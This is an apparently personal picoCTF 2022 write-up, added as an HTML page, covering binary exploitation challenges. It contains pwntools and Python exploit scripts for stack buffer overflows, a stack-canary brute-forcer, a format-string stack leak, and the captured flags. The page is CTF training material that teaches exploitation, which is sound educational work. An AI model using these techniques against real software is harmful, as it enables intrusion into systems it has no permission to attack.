@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone</title>
+    <link rel="stylesheet" href="../../css/style.css">
+  </head>
+
+<h1 id="picoctf-2022-binary-exploitation">picoCTF 2022 - Binary Exploitation</h1>
+<p>March 15th-29th</p>
+<h2 id="basic-file-exploit">basic-file-exploit</h2>
+<p>Open .c file.<br>Search for flag. 2nd result is:  </p>
+<pre><code class="lang-c">printf(<span class="hljs-string">"Please enter the entry number of your data:\n"</span>);
+...
+<span class="hljs-keyword">if</span> ((entry_number = strtol(entry, NULL, <span class="hljs-number">10</span>)) == <span class="hljs-number">0</span>) {
+    puts(flag);
+    fseek(stdin, <span class="hljs-number">0</span>, SEEK_END);
+    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);
+}
+</code></pre>
+<p>Enter number 0 to the prompt and we get the flag.  </p>
+<pre><code>┌──(horace@kali)-[~/ctf/pico22/basic-<span class="hljs-keyword">file</span>-exploit]
+└─$ ./connect.sh                                                            <span class="hljs-number">130</span> ⨯
+Hi, welcome <span class="hljs-keyword">to</span> my echo chamber!
+<span class="hljs-keyword">Type</span> <span class="hljs-string">'1'</span> <span class="hljs-keyword">to</span> enter a phrase into our database
+<span class="hljs-keyword">Type</span> <span class="hljs-string">'2'</span> <span class="hljs-keyword">to</span> echo a phrase <span class="hljs-keyword">in</span> our database
+<span class="hljs-keyword">Type</span> <span class="hljs-string">'3'</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">exit</span> the <span class="hljs-keyword">program</span>
+<span class="hljs-number">1</span>
+<span class="hljs-number">1</span>
+Please enter your data:
+spooky
+spooky
+Please enter the length <span class="hljs-keyword">of</span> your data:
+<span class="hljs-number">6</span>
+<span class="hljs-number">6</span>
+Your entry number <span class="hljs-keyword">is</span>: <span class="hljs-number">1</span>
+<span class="hljs-keyword">Write</span> successful, would you like <span class="hljs-keyword">to</span> <span class="hljs-keyword">do</span> anything <span class="hljs-keyword">else</span>?
+<span class="hljs-number">2</span>
+<span class="hljs-number">2</span>
+Please enter the entry number <span class="hljs-keyword">of</span> your data:
+<span class="hljs-number">0</span>
+<span class="hljs-number">0</span>
+picoCTF<span class="hljs-comment">{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_C5BC1889}</span>
+</code></pre><h2 id="buffer-overflow-0">buffer overflow 0</h2>
+<p>gets() takes 100 bytes:</p>
+<pre><code>char buf1[<span class="hljs-number">100</span>]<span class="hljs-comment">;</span>
+gets(buf1)<span class="hljs-comment">; </span>
+vuln(buf1)<span class="hljs-comment">;</span>
+</code></pre><p>But the buffer in vuln() where the get&#39;ted data gets strcpy&#39;d into is only 16 bytes.</p>
+<pre><code><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vuln</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *input)</span></span>{
+  <span class="hljs-keyword">char</span> buf2[<span class="hljs-number">16</span>];
+  <span class="hljs-built_in">strcpy</span>(buf2, input);
+}
+</code></pre><p>Submitting more than 16 bytes on <code>Input:</code> will cause a segfault.
+The author has kindly set up a segfault handler which will print the flag.</p>
+<pre><code>void sigsegv_handler(int sig) {
+  printf(<span class="hljs-string">"%s\n"</span>, flag);
+  fflush(stdout);
+  <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);
+}
+</code></pre><pre><code>┌──(<span class="hljs-selector-tag">horace</span>@<span class="hljs-keyword">kali</span>)-[~/<span class="hljs-keyword">ctf</span>/<span class="hljs-keyword">pico22</span>/<span class="hljs-keyword">buffer</span>-<span class="hljs-keyword">overflow</span>-<span class="hljs-keyword">0</span>]
+└─$ python2 -c <span class="hljs-string">'print "A"*101'</span>                                                                                                                             <span class="hljs-number">1</span> ⨯
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+┌──(horace@kali)-[~/ctf/pico22/buffer-overflow-<span class="hljs-number">0</span>]
+└─$ ./connect.sh
+Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+picoCTF{<span class="hljs-selector-tag">ov3rfl0ws_ar3nt_that_bad_6091cc95</span>}
+</code></pre><h2 id="buffer-overflow-1">buffer overflow 1</h2>
+<p>Overflow the buffer and return to the win() function.  </p>
+<p>I&#39;ve managed to overwrite the return address with 4 <code>E</code>s.  </p>
+<pre><code>┌──(horace@kali)-[~/ctf/pico22/<span class="hljs-keyword">buffer</span>-overflow-<span class="hljs-number">1</span>]
+└─$ python2 -c <span class="hljs-symbol">'print</span> <span class="hljs-string">"A"</span>*<span class="hljs-number">32</span> + <span class="hljs-string">"B"</span>*<span class="hljs-number">4</span> + <span class="hljs-string">"C"</span>*<span class="hljs-number">4</span> + <span class="hljs-string">"D"</span>*<span class="hljs-number">4</span> + <span class="hljs-string">"E"</span>*<span class="hljs-number">4</span>'  
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEE
+┌──(horace@kali)-[~/ctf/pico22/<span class="hljs-keyword">buffer</span>-overflow-<span class="hljs-number">1</span>]
+└─$ ./connect.sh                                             
+Please enter your <span class="hljs-built_in">string</span>: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEE
+Okay, <span class="hljs-built_in">time</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">return</span>... Fingers Crossed... Jumping <span class="hljs-keyword">to</span> <span class="hljs-number">0</span>x45454545
+</code></pre><p><code>win()</code> is at <code>0x080491f6</code>.</p>
+<pre><code>┌──(<span class="hljs-selector-tag">horace</span>@<span class="hljs-keyword">kali</span>)-[~/<span class="hljs-keyword">ctf</span>/<span class="hljs-keyword">pico22</span>/<span class="hljs-keyword">buffer</span>-<span class="hljs-keyword">overflow</span>-<span class="hljs-keyword">1</span>]
+└─$ readelf -s vuln | grep win
+    <span class="hljs-number">63</span>: <span class="hljs-number">080491</span>f6   <span class="hljs-number">139</span> FUNC    GLOBAL DEFAULT   <span class="hljs-number">13</span> win
+</code></pre><p>Write a python2 script to print the payload:</p>
+<pre><code class="lang-python">#!/usr/bin/python2
+<span class="hljs-keyword">import</span> <span class="hljs-keyword">struct</span>
+
+junk = <span class="hljs-string">"A"</span>*<span class="hljs-number">44</span>
+eip = <span class="hljs-keyword">struct</span>.pack(<span class="hljs-string">'&lt;I'</span>, <span class="hljs-number">0x080491f</span>6)
+
+payload = junk + eip
+<span class="hljs-built_in">print</span> payload
+</code></pre>
+<p>And pass it to the vulnerable program to get the flag :)</p>
+<pre><code>┌──(<span class="hljs-selector-tag">horace</span>@<span class="hljs-keyword">kali</span>)-[~/<span class="hljs-keyword">ctf</span>/<span class="hljs-keyword">pico22</span>/<span class="hljs-keyword">buffer</span>-<span class="hljs-keyword">overflow</span>-<span class="hljs-keyword">1</span>]
+└─$ python2 exploit.py | ./connect.sh
+Please enter your string: 
+Okay, time to return... Fingers Crossed... Jumping to <span class="hljs-number">0</span>x80491f6
+picoCTF{<span class="hljs-selector-tag">addr3ss3s_ar3_3asy_586b0fef</span>}
+</code></pre><h2 id="rps">RPS</h2>
+<p>The vulnerability is here, in the <code>play()</code> function:</p>
+<pre><code><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">play</span><span class="hljs-params">()</span> </span>{
+  ...
+  <span class="hljs-keyword">int</span> computer_turn = rand() % <span class="hljs-number">3</span>;
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"You played: %s\n"</span>, player_turn);
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"The computer played: %s\n"</span>, hands[computer_turn]);
+
+  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(player_turn, loses[computer_turn])) {
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"You win! Play again?"</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+  }
+  ...
+</code></pre><p><code>strstr</code> searches for a substring inside of a string.
+Therefore, because there&#39;s 100 bytes of space for our answer, we can simply submit <code>rockpaperscissors</code> as our answer and win every time.</p>
+<h2 id="x-sixty-what">x-sixty-what</h2>
+<pre><code>Description
+Overflow x64 code. 
+Most problems before this are <span class="hljs-number">32</span>-<span class="hljs-built_in">bit</span> x86. Now we<span class="hljs-symbol">'ll</span> consider <span class="hljs-number">64</span>-<span class="hljs-built_in">bit</span> x86 which <span class="hljs-keyword">is</span> a little different! Overflow the <span class="hljs-keyword">buffer</span> <span class="hljs-keyword">and</span> change the <span class="hljs-keyword">return</span> address <span class="hljs-keyword">to</span> the flag <span class="hljs-keyword">function</span> <span class="hljs-keyword">in</span> this program. Download source.
+</code></pre><p>I don&#39;t particularly understand this one. </p>
+<p>The offset to overwrite RIP is 72 bytes. 
+Locally you don&#39;t have to do anything unique, you just overflow the address of <code>flag()</code> into RIP and it&#39;ll work.</p>
+<pre><code class="lang-python3"><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-built_in">from</span> pwn import *
+context.log_level = <span class="hljs-string">'debug'</span>
+
+io = <span class="hljs-built_in">process</span>(<span class="hljs-string">"./vuln"</span>)
+
+p  = b<span class="hljs-string">"A"</span>*<span class="hljs-number">64</span>            <span class="hljs-comment"># buf</span>
+p += b<span class="hljs-string">"B"</span>*<span class="hljs-number">8</span>             <span class="hljs-comment"># Padding</span>
+p += p64(<span class="hljs-number">0x00401236</span>)    <span class="hljs-comment"># flag()</span>
+
+io.sendlineafter(b<span class="hljs-string">"Welcome to 64-bit. Give me a string that gets you the flag: \n"</span>, p)
+io.recv()
+io.<span class="hljs-built_in">close</span>()
+</code></pre>
+<p>But remotely this won&#39;t work.</p>
+<p>According to a write-up from 2019 about a similar challenge, it&#39;s because the stack needs to be 16 byte aligned (a 64bit thing).
+<a href="https://tcode2k16.github.io/blog/posts/picoctf-2019-writeup/binary-exploitation/#newoverflow-1">https://tcode2k16.github.io/blog/posts/picoctf-2019-writeup/binary-exploitation/#newoverflow-1</a>
+All credit goes there.</p>
+<p>How calling another function (in this case a <code>ret</code>) fixes the problem I have no idea, but it does (64 + 8 + 8 + 8 is only 88 which still isn&#39;t a multiple of 16?).</p>
+<pre><code>┌──(horace<span class="hljs-variable">@kali</span>)-[~<span class="hljs-regexp">/ctf/pico</span>22/x-sixty-what]
+└─<span class="hljs-variable">$ </span>gdb -q vuln
+gdb-peda<span class="hljs-variable">$ </span><span class="hljs-keyword">break</span> main
+Breakpoint <span class="hljs-number">1</span> at <span class="hljs-number">0x4012da</span>
+gdb-peda<span class="hljs-variable">$ </span>run
+gdb-peda<span class="hljs-variable">$ </span>ropsearch <span class="hljs-string">"ret"</span>
+Searching <span class="hljs-keyword">for</span> ROP <span class="hljs-symbol">gadget:</span> <span class="hljs-string">'ret'</span> <span class="hljs-symbol">in:</span> binary ranges
+<span class="hljs-number">0x0040101a</span> : (b<span class="hljs-string">'c3'</span>)    ret
+</code></pre><pre><code class="lang-python3">#!/usr/bin/env python3
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.log_level = <span class="hljs-string">'debug'</span>
+
+io = remote(<span class="hljs-string">"saturn.picoctf.net"</span>, <span class="hljs-number">55078</span>)
+
+p  = b<span class="hljs-string">"A"</span>*<span class="hljs-number">64</span>                # buf
+p += b<span class="hljs-string">"B"</span>*<span class="hljs-number">8</span>                     # Padding
+p += p64(<span class="hljs-number">0x0040101a</span>)    # Overwrite RIP: `ret;` (<span class="hljs-keyword">if</span> local, comment out)
+p += p64(<span class="hljs-number">0x00401236</span>)    # flag()
+
+io.sendlineafter(b<span class="hljs-string">"Welcome to 64-bit. Give me a string that gets you the flag: \n"</span>, p)
+io.recv()
+io.close()
+</code></pre>
+<h2 id="buffer-overflow-2">buffer overflow 2</h2>
+<p>We want to return to win() and set the arguments to 0xCAFEF00D and 0xF00DF00D.
+You can write the arguments for the returned-to function (in this example) +4 bytes after the return address modification.
+You could find this information via GDB. Instead I modified <code>vuln.c</code> to print out the arguments and printed BBBB, CCCC, DDDD, etc. until I found the offset to the arguments.</p>
+<pre><code>...
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">win</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> arg1, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> arg2)</span> </span>{
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"0x%x \n"</span>, arg1);
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"0x%x \n"</span>, arg2);
+  <span class="hljs-keyword">char</span> buf[FLAGSIZE];
+  FILE *f = fopen(<span class="hljs-string">"flag.txt"</span>,<span class="hljs-string">"r"</span>);
+  ...
+</code></pre><p>Compile for 32bit with no protections
+(might need to install apt install gcc-multilib if on 64bit machine):</p>
+<pre><code><span class="hljs-attribute">gcc</span> vuln.c -o vuln -fno-stack-protector -D_FORTIFY_SOURCE=<span class="hljs-number">0</span> -z execstack -<span class="hljs-literal">no</span>-pie
+</code></pre><p>We first need the address of <code>win()</code>:</p>
+<pre><code>┌──(<span class="hljs-selector-tag">horace</span>@<span class="hljs-keyword">kali</span>)-[~/<span class="hljs-keyword">ctf</span>/<span class="hljs-keyword">pico22</span>/<span class="hljs-keyword">buffer</span>-<span class="hljs-keyword">overflow</span>-<span class="hljs-keyword">2</span>]
+└─$ readelf -s vuln | grep win                                                                  <span class="hljs-number">139</span> ⨯
+    <span class="hljs-number">64</span>: <span class="hljs-number">08049296</span>   <span class="hljs-number">162</span> FUNC    GLOBAL DEFAULT   <span class="hljs-number">15</span> win
+</code></pre><p>And now we can write our python script to generate the payload:</p>
+<pre><code class="lang-python"><span class="hljs-comment">#!/usr/bin/python2</span>
+import <span class="hljs-class"><span class="hljs-keyword">struct</span></span>
+
+junk = <span class="hljs-string">"A"</span>*<span class="hljs-number">112</span>
+eip = <span class="hljs-class"><span class="hljs-keyword">struct</span>.<span class="hljs-title">pack</span>('&lt;<span class="hljs-title">I</span>', 0<span class="hljs-title">x08049296</span>)</span>
+junk2 = <span class="hljs-string">"B"</span>*<span class="hljs-number">4</span>
+arg1 = <span class="hljs-class"><span class="hljs-keyword">struct</span>.<span class="hljs-title">pack</span>('&lt;<span class="hljs-title">I</span>', 0<span class="hljs-title">xCAFEF00D</span>)</span>
+arg2 = <span class="hljs-class"><span class="hljs-keyword">struct</span>.<span class="hljs-title">pack</span>('&lt;<span class="hljs-title">I</span>', 0<span class="hljs-title">xF00DF00D</span>)</span>
+
+payload = junk + eip + junk2 + arg1 + arg2
+print payload
+</code></pre>
+<pre><code>┌──(<span class="hljs-selector-tag">horace</span>@<span class="hljs-keyword">kali</span>)-[~/<span class="hljs-keyword">ctf</span>/<span class="hljs-keyword">pico22</span>/<span class="hljs-keyword">buffer</span>-<span class="hljs-keyword">overflow</span>-<span class="hljs-keyword">2</span>]
+└─$ python2 exploit.py | ./connect.sh                                                           <span class="hljs-number">139</span> ⨯
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAA�BBBB
+picoCTF{<span class="hljs-selector-tag">argum3nt5_4_d4yZ_74abd092</span>}
+</code></pre><h2 id="buffer-overflow-3">buffer overflow 3</h2>
+<p>This isn&#39;t a real gcc built-in stack canary.
+They&#39;re instead emulating a stack canary by reading in 4 bytes from a local .txt file to function as a canary.</p>
+<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUFSIZE 64</span>
+...
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vuln</span><span class="hljs-params">()</span></span>{
+   <span class="hljs-keyword">char</span> canary[CANARY_SIZE];
+   <span class="hljs-keyword">char</span> buf[BUFSIZE];
+   ...
+   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Input&gt; "</span>);
+   read(<span class="hljs-number">0</span>,buf,count);
+...
+</code></pre>
+<p>The length of <code>buf</code> is 64.
+However, we can decide how many bytes to write into this buffer via the <code>How Many Bytes will You Write Into the Buffer?</code> prompt, so we can overflow it.
+If we write more than 64 bytes, the <code>canary</code> variable above will be modified and we get:
+<code>***** Stack Smashing Detected ***** : Canary Value Corrupt!</code></p>
+<p>So we need to bypass the canary value.
+Since the canary is being read from a local canary.txt file, we can assume that the canary doesn&#39;t change on each run of the binary.
+This means we can bruteforce the canary by running the binary over and over again.
+It might change per picoCTF instance (it doesn&#39;t), but that doesn&#39;t matter.</p>
+<p>We know that the canary is 4 bytes long, so we start by writing 65 bytes into the buffer:<br>&quot;X&quot;<em>64 + &quot;a&quot; -&gt; crash.<br>&quot;X&quot;</em>64 + &quot;B&quot; -&gt; Ah! No crash. This means the 1st byte of the canary is B.<br>Rinse and repeat until you have all 4 characters.</p>
+<p>Here&#39;s my script for bruteforcing:</p>
+<pre><code class="lang-python"><span class="hljs-comment">#!/usr/bin/python3</span>
+from pwn <span class="hljs-built_in">import</span> *
+context(<span class="hljs-attr">arch</span> = 'i386', <span class="hljs-attr">os</span> = 'linux')
+context.<span class="hljs-attr">log_level</span> = 'error'
+
+<span class="hljs-attr">host</span> = <span class="hljs-string">"saturn.picoctf.net"</span>
+<span class="hljs-attr">port</span> = <span class="hljs-number">50064</span>
+
+<span class="hljs-attr">valid</span> = b<span class="hljs-string">"Ok... Now Where's the Flag?\n"</span>
+<span class="hljs-attr">invalid</span> = b'***** Stack Smashing Detected ***** : Canary Value Corrupt!\n'
+
+<span class="hljs-attr">charset</span> = <span class="hljs-string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"</span>
+<span class="hljs-attr">base_input</span> = <span class="hljs-string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="hljs-attr">canary</span> = <span class="hljs-string">""</span>
+
+<span class="hljs-comment"># Bruteforce byte range 65 to 68 (the 4 bytes of the canary)</span>
+<span class="hljs-attr">charset_pos</span> = <span class="hljs-number">0</span>
+<span class="hljs-attr">byte_num</span> = <span class="hljs-number">65</span>
+while byte_num &lt; <span class="hljs-number">69</span>:
+    <span class="hljs-keyword">if</span> <span class="hljs-attr">charset_pos</span> == len(charset):
+        print(<span class="hljs-string">"[-] Bruteforce failed. Reached end of charset. Need moar chars"</span>)
+        break
+
+    <span class="hljs-attr">b</span> = remote(host, port)
+    b.recvline()    <span class="hljs-comment"># b'How Many Bytes will You Write Into the Buffer?\n'</span>
+    b.sendline(str(byte_num).encode())
+    b.recvuntil(b<span class="hljs-string">"Input&gt; "</span>)
+    <span class="hljs-attr">input</span> = base_input + canary + charset[charset_pos]
+    b.sendline(input.encode())
+
+    <span class="hljs-attr">output</span> = b.recvline()
+
+    <span class="hljs-comment"># b"Ok... Now Where's the Flag?\n" if canary not corrupted.</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-attr">output</span> == valid:     
+        print(<span class="hljs-string">"[+] Found byte #"</span> + str(byte_num) + <span class="hljs-string">": "</span> + charset[charset_pos])
+        canary += charset[charset_pos]      <span class="hljs-comment"># Save canary</span>
+        byte_num += <span class="hljs-number">1</span>       <span class="hljs-comment"># Increment to bruteforce next byte</span>
+        <span class="hljs-attr">charset_pos</span> = <span class="hljs-number">0</span>     <span class="hljs-comment"># Start at beginning of charset again</span>
+    <span class="hljs-comment"># b'***** Stack Smashing Detected ***** : Canary Value Corrupt!\n' if corrupted.</span>
+    elif <span class="hljs-attr">output</span> == invalid:
+        charset_pos += <span class="hljs-number">1</span>       <span class="hljs-comment"># Bruteforce next value in charset</span>
+
+    b.close()
+
+print(<span class="hljs-string">"[+] Final canary: "</span> + canary)
+</code></pre>
+<p>We find that the canary is &quot;BiRd&quot;.
+(funnily enough &quot;bird&quot; was my test canary.txt when figuring out the exploit locally)</p>
+<p>With the canary found we now just need to overwrite EIP and jump to win().
+This gave me a few problems, so I modified the source code to print out the address I&#39;m returning to:</p>
+<pre><code>printf(<span class="hljs-string">"Ok... Now Where's the Flag? Returning to: 0x%x \n"</span>, __builtin_return_address(<span class="hljs-number">0</span>))<span class="hljs-comment">;</span>
+</code></pre><p>(compile with gcc: <code>gcc vuln.c -o vuln -fno-stack-protector -D_FORTIFY_SOURCE=0 -z execstack -no-pie -m32</code>)</p>
+<p>With a little trial and error I found that we need to write 88 bytes, with bytes 84-88 overwriting EIP.<br>win() is at 0x08049336.</p>
+<pre><code>┌──(<span class="hljs-selector-tag">horace</span>@<span class="hljs-keyword">kali</span>)-[~/<span class="hljs-keyword">ctf</span>/<span class="hljs-keyword">pico22</span>/<span class="hljs-keyword">buffer</span>-<span class="hljs-keyword">overflow</span>-<span class="hljs-keyword">3</span>]
+└─$ readelf -s vuln | grep win
+    <span class="hljs-number">70</span>: <span class="hljs-number">08049336</span>   <span class="hljs-number">159</span> FUNC    GLOBAL DEFAULT   <span class="hljs-number">15</span> win
+</code></pre><p>Here&#39;s my final exploit:</p>
+<pre><code class="lang-python"><span class="hljs-comment">#!/usr/bin/python3</span>
+from pwn <span class="hljs-built_in">import</span> *
+context(<span class="hljs-attr">arch</span> = 'i386', <span class="hljs-attr">os</span> = 'linux')
+context.<span class="hljs-attr">log_level</span> = 'error'
+
+<span class="hljs-attr">host</span> = <span class="hljs-string">"saturn.picoctf.net"</span>
+<span class="hljs-attr">port</span> = <span class="hljs-number">50064</span>
+
+<span class="hljs-attr">valid</span> = b<span class="hljs-string">"Ok... Now Where's the Flag?\n"</span>
+<span class="hljs-attr">invalid</span> = b'***** Stack Smashing Detected ***** : Canary Value Corrupt!\n'
+
+<span class="hljs-attr">charset</span> = <span class="hljs-string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"</span>
+<span class="hljs-attr">base_input</span> = <span class="hljs-string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="hljs-attr">canary</span> = <span class="hljs-string">""</span>
+
+<span class="hljs-comment"># Bruteforce byte range 65 to 68 (the 4 bytes of the canary)</span>
+<span class="hljs-attr">charset_pos</span> = <span class="hljs-number">0</span>
+<span class="hljs-attr">byte_num</span> = <span class="hljs-number">65</span>
+while byte_num &lt; <span class="hljs-number">69</span>:
+    <span class="hljs-keyword">if</span> <span class="hljs-attr">charset_pos</span> == len(charset):
+        print(<span class="hljs-string">"[-] Bruteforce failed. Reached end of charset. Need moar chars"</span>)
+        break
+
+    <span class="hljs-attr">b</span> = remote(host, port)
+    b.recvline()    <span class="hljs-comment"># b'How Many Bytes will You Write Into the Buffer?\n'</span>
+    b.sendline(str(byte_num).encode())
+    b.recvuntil(b<span class="hljs-string">"Input&gt; "</span>)
+    <span class="hljs-attr">input</span> = base_input + canary + charset[charset_pos]
+    b.sendline(input.encode())
+
+    <span class="hljs-attr">output</span> = b.recvline()
+
+    <span class="hljs-comment"># b"Ok... Now Where's the Flag?\n" if canary not corrupted.</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-attr">output</span> == valid:     
+        print(<span class="hljs-string">"[+] Found byte #"</span> + str(byte_num) + <span class="hljs-string">": "</span> + charset[charset_pos])
+        canary += charset[charset_pos]      <span class="hljs-comment"># Save canary</span>
+        byte_num += <span class="hljs-number">1</span>       <span class="hljs-comment"># Increment to bruteforce next byte</span>
+        <span class="hljs-attr">charset_pos</span> = <span class="hljs-number">0</span>     <span class="hljs-comment"># Start at beginning of charset again</span>
+    <span class="hljs-comment"># b'***** Stack Smashing Detected ***** : Canary Value Corrupt!\n' if corrupted.</span>
+    elif <span class="hljs-attr">output</span> == invalid:
+        charset_pos += <span class="hljs-number">1</span>       <span class="hljs-comment"># Bruteforce next value in charset</span>
+
+    b.close()
+
+print(<span class="hljs-string">"[+] Final canary: "</span> + canary)
+
+<span class="hljs-comment"># Send final payload to execute win() and retireve flag</span>
+<span class="hljs-attr">b</span> = remote(host, port)
+b.recvline()    <span class="hljs-comment"># b'How Many Bytes will You Write Into the Buffer?\n'</span>
+b.sendline(b<span class="hljs-string">"88"</span>)
+b.recvuntil(b<span class="hljs-string">"Input&gt; "</span>)
+<span class="hljs-attr">input</span> = (base_input + canary + 'B'*<span class="hljs-number">12</span> + 'C'*<span class="hljs-number">4</span>).encode() + p32(<span class="hljs-number">0</span>x08049336)
+print(input)
+b.sendline(input)
+
+print(b.recvline())
+print(b.recvline())
+</code></pre>
+<pre><code>┌──(horace@kali)-[~/ctf/pico22/buffer-overflow<span class="hljs-number">-3</span>]
+└─$ python3 brute_net.py                                                                                     <span class="hljs-number">139</span> ⨯
+[+] Found <span class="hljs-keyword">byte</span> <span class="hljs-meta">#65: B</span>
+[+] Found <span class="hljs-keyword">byte</span> <span class="hljs-meta">#66: i</span>
+[+] Found <span class="hljs-keyword">byte</span> <span class="hljs-meta">#67: R</span>
+[+] Found <span class="hljs-keyword">byte</span> <span class="hljs-meta">#68: d</span>
+[+] Final canary: BiRd
+b<span class="hljs-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABiRdBBBBBBBBBBBBCCCC6\x93\x04\x08'</span>
+b<span class="hljs-string">"Ok... Now Where's the Flag?\n"</span>
+b<span class="hljs-string">'picoCTF{Stat1C_c4n4r13s_4R3_b4D_32625866}\n'</span>
+</code></pre><h2 id="flag-leak">flag leak</h2>
+<p>Just bruteforce everything :)<br>There&#39;s a format string vulnerability in:</p>
+<pre><code>scanf(<span class="hljs-string">"%127s"</span>, story)<span class="hljs-comment">;</span>
+printf(<span class="hljs-string">"Here's a story - \n"</span>)<span class="hljs-comment">;</span>
+printf(<span class="hljs-name">story</span>)<span class="hljs-comment">;</span>
+</code></pre><p>scanf lets us write anything we want into <code>story</code>.<br>And then <code>printf(story)</code> will print it for us.<br>There&#39;s a format string vulnerability here because they&#39;re printing the variable directly, so we can cause it to print data on the stack with <code>printf(&quot;%p&quot;)</code>.<br>There&#39;d be no vuln if the code was <code>printf(&quot;%s&quot;, story);</code> instead.</p>
+<p>You can print the Nth argument on the stack with with <code>%N$p</code>.<br>So, as mentioned, we can just bruteforce printing strings on the stack until we find the flag :)</p>
+<pre><code class="lang-python"><span class="hljs-comment">#!/usr/bin/python3</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.log_level = <span class="hljs-string">'error'</span>
+flag = <span class="hljs-string">b'picoCTF{'</span>
+
+arg = <span class="hljs-number">0</span>
+<span class="hljs-keyword">while</span> arg &lt; <span class="hljs-number">40</span>:
+        payload = <span class="hljs-string">b"%"</span> + str(arg).encode() + <span class="hljs-string">b"$s"</span>
+
+        <span class="hljs-comment">#b = process("./vuln")</span>
+        b = remote(<span class="hljs-string">"saturn.picoctf.net"</span>, <span class="hljs-number">61594</span>)
+        <span class="hljs-comment"># b"Tell me a story and then I'll tell you one &gt;&gt; "</span>
+        b.recv()
+        b.sendline(payload)
+        <span class="hljs-comment"># b"Here's a story - \n"</span>
+        b.recvline()
+        <span class="hljs-keyword">try</span>:
+                print(b.recvline())
+        <span class="hljs-comment"># For when there's no output</span>
+        <span class="hljs-keyword">except</span> EOFError:
+                <span class="hljs-keyword">pass</span>
+
+        b.close()
+        arg += <span class="hljs-number">1</span>
+</code></pre>
+<pre><code>┌──(horace@kali)-[~/ctf/pico22/flag-leak]
+└─<span class="hljs-formula">$ python3 bf.py
+b'%0$</span>s<span class="hljs-tag">\<span class="hljs-name">n</span></span>'
+b'<span class="hljs-comment">%1$s\n'</span>
+b'<span class="hljs-tag">\<span class="hljs-name">x</span></span>10<span class="hljs-tag">\<span class="hljs-name">x</span></span>11<span class="hljs-tag">\<span class="hljs-name">xed</span></span><span class="hljs-tag">\<span class="hljs-name">xf</span></span>7<span class="hljs-tag">\<span class="hljs-name">n</span></span>'
+b'<span class="hljs-tag">\<span class="hljs-name">x</span></span>81<span class="hljs-tag">\<span class="hljs-name">xc</span></span>3<span class="hljs-tag">\<span class="hljs-name">xba</span></span>,<span class="hljs-tag">\<span class="hljs-name">n</span></span>'
+b'(null)<span class="hljs-tag">\<span class="hljs-name">n</span></span>'
+b'<span class="hljs-tag">\<span class="hljs-name">x</span></span>07/<span class="hljs-tag">\<span class="hljs-name">n</span></span>'
+b'<span class="hljs-tag">\<span class="hljs-name">n</span></span>'
+b'(null)<span class="hljs-tag">\<span class="hljs-name">n</span></span>'
+b'<span class="hljs-tag">\<span class="hljs-name">xb</span></span>3.<span class="hljs-tag">\<span class="hljs-name">n</span></span>'
+b'<span class="hljs-tag">\<span class="hljs-name">n</span></span>'
+b'(null)<span class="hljs-tag">\<span class="hljs-name">n</span></span>'
+b'<span class="hljs-tag">\<span class="hljs-name">n</span></span>'
